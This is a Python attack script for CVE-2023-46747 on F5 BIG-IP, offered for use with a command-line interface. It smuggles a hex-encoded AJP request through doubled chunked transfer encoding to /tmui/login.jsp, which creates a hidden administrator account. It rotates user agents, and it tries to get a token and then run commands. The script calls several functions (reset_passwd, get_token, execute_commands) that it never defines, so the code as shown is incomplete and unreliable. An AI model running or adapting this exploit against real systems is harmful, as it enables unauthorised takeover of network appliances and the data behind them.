import argparse
import binascii
import json
import random
import time
import urllib3
import requests

urllib3.disable_warnings()

def determine_whether_to_use_burp_suite(proxy_url):
    try:
        favicon_url = f"{proxy_url}/favicon.ico"
        resp = requests.get(favicon_url, verify=False, timeout=5)
        return resp.status_code == 200
    except:
        return False

def generate_string(num):
    charset = 'abcdefghijklmnopqrstuvwxyz0123456789'
    return ''.join(random.choice(charset) for _ in range(num))

def get_random_agent():
    agent_list = [
        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.89 Safari/537.36'
    ]
    return random.choice(agent_list)

def unauth_create_user(target, username, password, proxy):
    login_request_hex = "0008485454502f312e310000122f746d75692f436f6e74726f6c2f666f726d0000093132372e302e302e310000096c6f63616c686f73740000096c6f63616c686f7374000050000003000b546d75692d44756262756600000b424242424242424242424200000a52454d4f5445524f4c450000013000a00b00096c6f63616c686f73740003000561646d696e000501715f74696d656e6f773d61265f74696d656e6f775f6265666f72653d2668616e646c65723d253266746d756925326673797374656d25326675736572253266637265617465262626666f726d5f706167653d253266746d756925326673797374656d253266757365722532666372656174652e6a737025336626666f726d5f706167655f6265666f72653d26686964654f626a4c6973743d265f62756676616c75653d65494c3452556e537758596f5055494f47634f4678326f30305863253364265f62756676616c75655f6265666f72653d2673797374656d757365722d68696464656e3d5b5b2241646d696e6973747261746f72222c225b416c6c5d225d5d2673797374656d757365722d68696464656e5f6265666f72653d266e616d653d" + binascii.hexlify(username.encode()).decode() + "266e616d655f6265666f72653d267061737377643d" + binascii.hexlify(password.encode()).decode() + "267061737377645f6265666f72653d2666696e69736865643d782666696e69736865645f6265666f72653d00ff00"
    login_data = b"204\r\n" + binascii.unhexlify(login_request_hex) + b"\r\n0\r\n\r\n"
    url = f"{target}/tmui/login.jsp"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Transfer-Encoding": "chunked, chunked",
        "User-Agent": get_random_agent()
    }
    try:
        resp = requests.post(url=url, headers=headers, data=login_data, verify=False, proxies=proxy)
        time.sleep(5)
        return resp.status_code == 200
    except:
        return False

def exploit(target, proxy):
    username = generate_string(5)
    password = generate_string(12)
    print(f"[*] Start to attack: {target}")
    if unauth_create_user(target, username, password, proxy):
        print(f"[*] User may have been created successfully. Verifying by obtaining a token...")
        pw_change = reset_passwd(target, username, password, proxy)
        if pw_change:
            token = get_token(target, username, password, proxy)
            if token:
                print(f"[+] username: [{username}], password: [{password}], token: [{token}]. The website is vulnerable to CVE-2023-46747!")
                execute_commands(target, token, proxy)
            else:
                print(f"[-] Failed to obtain token for username: [{username}], password: [{password}].")
        else:
            print(f"[-] Unable to change initial password for username: [{username}], password: [{password}].")
    else:
        print("[-] No vulnerability found on this site.")

def main():
    parser = argparse.ArgumentParser(description="F5 BIG-IP TMUI remote code execution vulnerability CVE-2023-46747")
    parser.add_argument("-u", "--url", help="target URL", required=True)
    parser.add_argument("-p", "--proxy", help="proxy, e.g., http://127.0.0.1:7890")
    args = parser.parse_args()
    url = args.url.rstrip("/")
    proxy = {'http': args.proxy, 'https': args.proxy} if args.proxy else {}
    exploit(url, proxy)

if __name__ == "__main__":
    main()
